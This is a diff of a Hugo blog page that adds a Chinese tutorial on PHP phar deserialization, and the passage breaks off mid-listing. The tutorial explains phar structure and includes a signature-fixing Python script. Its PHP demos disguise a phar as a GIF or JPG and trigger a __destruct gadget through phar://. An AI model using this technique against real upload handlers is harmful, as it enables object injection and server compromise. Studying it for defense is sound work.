@@ -7,38 +7,38 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>Phar - DELETE</title><meta name="Description" content=""><meta property="og:title" content="Phar" />
+    <title>反序列化-phar - Delete&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="反序列化-phar" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://ML-hacker.github.io/posts/phar/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-02-06T14:35:52+08:00" />
-<meta property="article:modified_time" content="2024-02-06T14:35:52+08:00" />
+<meta property="article:published_time" content="2024-01-17T18:32:32+08:00" />
+<meta property="article:modified_time" content="2024-01-17T18:32:32+08:00" />
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Phar"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="反序列化-phar"/>
 <meta name="twitter:description" content=""/>
-<meta name="application-name" content="DELETE">
-<meta name="apple-mobile-web-app-title" content="DELETE">
+<meta name="application-name" content="Delete&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Delete&#39;s blog">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/phar/" /><link rel="prev" href="http://ML-hacker.github.io/posts/nosql-inject/" /><link rel="next" href="http://ML-hacker.github.io/posts/php-parameter/" />
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ML-hacker.github.io/posts/phar/" /><link rel="prev" href="http://ML-hacker.github.io/posts/n1ctf-ezmaira/" /><link rel="next" href="http://ML-hacker.github.io/posts/n1start/" />
 <link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Phar",
+        "headline": "反序列化-phar",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http://ML-hacker.github.io/posts/phar/"
-        },"genre": "posts","wordcount":  0 ,
-        "url": "http://ML-hacker.github.io/posts/phar/","datePublished": "2024-02-06T14:35:52+08:00","dateModified": "2024-02-06T14:35:52+08:00","publisher": {
+        },"genre": "posts","keywords": "PHP, 反序列化","wordcount":  1149 ,
+        "url": "http://ML-hacker.github.io/posts/phar/","datePublished": "2024-01-17T18:32:32+08:00","dateModified": "2024-01-17T18:32:32+08:00","publisher": {
             "@type": "Organization",
-            "name": "Author"},"author": {
+            "name": "Delete"},"author": {
                 "@type": "Person",
-                "name": "Author"
+                "name": "Delete"
             },"description": ""
     }
     </script></head>
@@ -56,10 +56,21 @@
     <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
-            <a href="/" title="DELETE"><span id="desktop-header-typeit" class="typeit"></span></a>
+            <a href="/" title="Delete&#39;s blog"><span id="desktop-header-typeit" class="typeit"></span></a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/friend"> Friend </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                     <i class="fas fa-adjust fa-fw"></i>
                     <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                         <option value="light">Light</option>
@@ -74,13 +85,29 @@
     <div class="header-container">
         <div class="header-wrapper">
             <div class="header-title">
-                <a href="/" title="DELETE"><span id="mobile-header-typeit" class="typeit"></span></a>
+                <a href="/" title="Delete&#39;s blog"><span id="mobile-header-typeit" class="typeit"></span></a>
             </div>
             <div class="menu-toggle" id="menu-toggle-mobile">
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/friend" title="">Friend</a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw"></i>
                 <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                     <option value="light">Light</option>
@@ -98,18 +125,881 @@
     <div id="search-dropdown-mobile"></div>
 </div>
 <main class="main">
-            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Phar</h1><div class="post-meta">
+            <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">反序列化-phar</h1><div class="post-meta">
             <div class="post-meta-line">
-                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
-                </span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-02-06">2024-02-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;0 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;0 minutes&nbsp;</div>
-        </div><div class="content" id="content"></div>
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/ML-hacker" title="Author" target="_blank" rel="noopener noreferrer author" class="author">Delete</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>WEB</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-17">2024-01-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-01-17">2024-01-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1149 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="content" id="content"><h1 id="phar反序列化" class="headerLink">
+    <a href="#phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="header-mark"></a>Phar反序列化</h1><p>参考文章：
+1、#https://aecous.github.io/2023/04/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-phar%E7%AF%87/
+2、#https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0DRDBGit30%3DKDsA3r%2BDcAiD9DQqwxvID&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6699#toc-3
+3、#https://boogipop.com/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/</p>
+<h2 id="0x01-什么是phar" class="headerLink">
+    <a href="#0x01-%e4%bb%80%e4%b9%88%e6%98%afphar" class="header-mark"></a>0x01 什么是phar？</h2><p>Phar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。
+默认开启版本 PHP version &gt;= 5.3</p>
+<h2 id="0x02关于phar的一些知识" class="headerLink">
+    <a href="#0x02%e5%85%b3%e4%ba%8ephar%e7%9a%84%e4%b8%80%e4%ba%9b%e7%9f%a5%e8%af%86" class="header-mark"></a>0x02关于phar的一些知识</h2><h3 id="phar的文件结构" class="headerLink">
+    <a href="#phar%e7%9a%84%e6%96%87%e4%bb%b6%e7%bb%93%e6%9e%84" class="header-mark"></a>phar的文件结构</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="mi">1</span><span class="err">、</span><span class="n">Stub</span>			<span class="c1">//Phar文件头
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">2</span><span class="err">、</span><span class="n">manifest</span>	<span class="c1">//压缩文件信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">3</span><span class="err">、</span><span class="n">contents</span>	<span class="c1">//压缩文件内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="err">、</span><span class="n">signature</span>	<span class="c1">//签名
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="stub" class="headerLink">
+    <a href="#stub" class="header-mark"></a>Stub</h4><p>stub是phar的文件头，如果没有这个就无法被识别为phar文件（但是不影响伪造成其他文件：gif、png、jpg and so on）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">xxx</span><span class="p">;</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用一些构造手法可以进行绕过</p>
+<h4 id="manifest-manifest-describing-the-contents" class="headerLink">
+    <a href="#manifest-manifest-describing-the-contents" class="header-mark"></a>manifest （manifest describing the contents）</h4><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。【引用】</p>
+<h4 id="contentsthe-file-contents" class="headerLink">
+    <a href="#contentsthe-file-contents" class="header-mark"></a>contents（<strong>the file contents</strong>）</h4><p>被压缩文件的内容。</p>
+<h4 id="signatureoptional-a-signature-for-verifying-phar-integrity-phar-file-format-only" class="headerLink">
+    <a href="#signatureoptional-a-signature-for-verifying-phar-integrity-phar-file-format-only" class="header-mark"></a>signature(<strong>[optional] a signature for verifying Phar integrity (phar file format only)</strong>)</h4><p>就是phar文件的签名，每次文件内容更改的时候都要重新生成新的签名
+<figure><img
+        
+        loading="lazy"
+        src="/img/phar/5.png"
+        srcset="/img/phar/5.png, /img/phar/5.png 1.5x, /img/phar/5.png 2x"
+        alt="/img/phar/5.png"
+        title="/img/phar/5.png" ></figure>
+可以看见</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="mi">20</span><span class="n">bytes</span> <span class="o">=&gt;</span> <span class="n">SHA1</span>       <span class="mh">0x0002</span>
+</span></span><span class="line"><span class="cl"><span class="mi">16</span><span class="n">bytes</span> <span class="o">=&gt;</span> <span class="n">MD5</span>
+</span></span><span class="line"><span class="cl"><span class="mi">32</span><span class="n">bytes</span> <span class="o">=&gt;</span> <span class="n">SHA256</span>     <span class="mh">0x0003</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span><span class="n">bytes</span> <span class="o">=&gt;</span> <span class="n">SHA512</span>     <span class="mh">0x0004</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">hashlib</span> <span class="nx">import</span> <span class="nx">sha1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">with</span> <span class="nx">open</span><span class="p">(</span><span class="s1">&#39;test.phar&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nx">file</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">f</span> <span class="o">=</span> <span class="nx">file</span><span class="o">.</span><span class="nx">read</span><span class="p">()</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">s</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="o">:-</span><span class="mi">28</span><span class="p">]</span> <span class="c1"># 获取要签名的数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">h</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="o">:</span><span class="p">]</span> <span class="c1"># 获取签名类型和GBMB标识
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">newf</span> <span class="o">=</span> <span class="nx">s</span> <span class="o">+</span> <span class="nx">sha1</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span><span class="o">.</span><span class="nx">digest</span><span class="p">()</span> <span class="o">+</span> <span class="nx">h</span> <span class="c1"># 数据 + 签名 + (类型 + GBMB)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">with</span> <span class="nx">open</span><span class="p">(</span><span class="s1">&#39;newtest.phar&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nx">file</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file</span><span class="o">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">newf</span><span class="p">)</span> <span class="c1"># 写入新文件
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="demo" class="headerLink">
+    <a href="#demo" class="header-mark"></a>demo</h3><p>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DTtest</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DTtest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/phar/1.png"
+        srcset="/img/phar/1.png, /img/phar/1.png 1.5x, /img/phar/1.png 2x"
+        alt="/img/phar/1.png"
+        title="/img/phar/1.png" ></figure>
+可以看见他的存储方式也是以反序列化的形式存在的</p>
+<h3 id="demo2" class="headerLink">
+    <a href="#demo2" class="header-mark"></a>demo2</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">DTtest</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;GIF89a&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//设置stub
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DTtest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$o</span><span class="o">-&gt;</span><span class="na">data</span><span class="o">=</span><span class="s1">&#39;hello DT!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//签名自动计算
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img
+        
+        loading="lazy"
+        src="/img/phar/2.png"
+        srcset="/img/phar/2.png, /img/phar/2.png 1.5x, /img/phar/2.png 2x"
+        alt="/img/phar/2.png"
+        title="/img/phar/2.png" ></figure>
+可以看见这里也是可以伪造了一个jpg的头文件
+测试了一下也是可以构造链子的，这里就不演示了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;phar://phar.jpg&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DTtest</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x03触发函数" class="headerLink">
+    <a href="#0x03%e8%a7%a6%e5%8f%91%e5%87%bd%e6%95%b0" class="header-mark"></a>0x03触发函数</h2><p><figure><img
+        
+        loading="lazy"
+        src="/img/phar/3.png"
+        srcset="/img/phar/3.png, /img/phar/3.png 1.5x, /img/phar/3.png 2x"
+        alt="/img/phar/3.png"
+        title="/img/phar/3.png" ></figure>
+为什么 Phar 会反序列化处理文件并且在文件操作中能够成功反序列化呢？</p>
+<h3 id="stream-api" class="headerLink">
+    <a href="#stream-api" class="header-mark"></a>Stream API</h3><p><a href="https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548" target="_blank" rel="noopener noreferrer">https://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548</a> ，重点关注：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">stream</span> <span class="o">=</span> <span class="nx">php_stream_open_wrapper_ex</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="p">(</span><span class="nx">use_include_path</span> <span class="o">?</span> <span class="nx">USE_PATH</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="nx">REPORT_ERRORS</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="k">NULL</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以注意，其使用的是php_stream系列API来打开一个文件。
+官方文档： <a href="https://www.php.net/manual/en/book.stream.php" target="_blank" rel="noopener noreferrer">https://www.php.net/manual/en/book.stream.php</a> ，可知，Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。这个phar就注册了phar://这个stream wrapper，可以看看注册了什么wrapper</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">&gt;</span> <span class="nx">var_dump</span><span class="p">(</span><span class="nx">stream_get_wrappers</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="k">array</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="s2">&#34;https&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;ftps&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span> <span class="s2">&#34;compress.zlib&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span> <span class="s2">&#34;compress.bzip2&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">&#34;php&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;file&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="o">=&gt;</span>
